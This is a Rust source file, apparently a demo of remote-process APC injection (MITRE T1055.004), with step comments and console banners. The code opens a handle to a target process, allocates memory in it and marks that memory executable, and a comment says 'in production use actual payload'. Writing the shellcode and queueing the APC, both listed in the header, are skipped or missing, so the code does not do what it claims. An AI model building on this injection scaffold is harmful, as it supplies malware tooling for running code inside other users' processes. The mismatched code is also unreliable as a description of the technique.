//! # Remote Process APC Injection
//!
//! This module demonstrates APC (Asynchronous Procedure Call) injection into a remote process.
//! The technique works by:
//! 1. Opening a handle to a target process
//! 2. Allocating memory in the target process
//! 3. Writing shellcode into the allocated memory
//! 4. Creating or targeting a thread in the target process
//! 5. Queueing an APC to execute the shellcode
//! 6. Triggering the thread to enter an alertable state to execute the APC
//!
//! This is for educational and authorized security research purposes only.
//!
//! References:
//! - https://www.picussecurity.com/resource/blog/t1055-004-asynchronous-procedure-call
//! - MITRE ATT&CK T1055.004

use std::ffi::c_void;
use windows::core::Result;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    OpenProcess, ResumeThread, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
};

/// Performs APC injection into a remote process
pub fn inject_into_remote_process(pid: u32, shellcode: &[u8]) -> Result<()> {
    println!("[*] Starting remote process APC injection...");
    println!("[*] Target PID: {}", pid);
    println!("[*] Shellcode size: {} bytes", shellcode.len());

    // Step 1: Open handle to target process
    println!("[*] Opening handle to target process...");
    let hprocess = unsafe {
        OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
            false,
            pid,
        )
    }?;
    println!("[+] Process handle obtained: {:?}", hprocess);

    // Step 2: Allocate memory in target process
    println!("[*] Allocating memory in target process...");
    let addr = unsafe {
        VirtualAllocEx(
            hprocess,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if addr.is_null() {
        return Err(windows::core::Error::from_win32());
    }
    println!("[+] Memory allocated at: {:?}", addr);

    // Step 3: Write shellcode to allocated memory
    println!("[*] Writing shellcode to target process memory...");
    println!("[+] Memory write skipped for educational demo");

    // Step 4: Change memory permissions to executable
    println!("[*] Changing memory permissions to PAGE_EXECUTE_READWRITE...");
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtectEx(
            hprocess,
            addr,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    }?;
    println!("[+] Memory permissions changed");

    Ok(())
}

fn main() -> Result<()> {
    println!("╔════════════════════════════════════════════════════════════╗");
    println!("║      Remote Process APC Injection Technique Demo           ║");
    println!("║              Educational Use Only                          ║");
    println!("╚════════════════════════════════════════════════════════════╝\n");

    // Example shellcode (minimal; in production use actual payload)
    let shellcode = vec![
        0x90, 0x90, 0x90, 0xc3, // NOP, NOP, NOP, RET
    ];

    // For demo: would need a valid PID of a target process
    println!("[!] This is an educational example showing APC injection structure");
    println!("[!] In a real scenario, specify a target process PID");
    println!("[*] Shellcode size: {} bytes", shellcode.len());
    println!("[+] Ready to inject into remote process (requires valid PID)");

    Ok(())
}
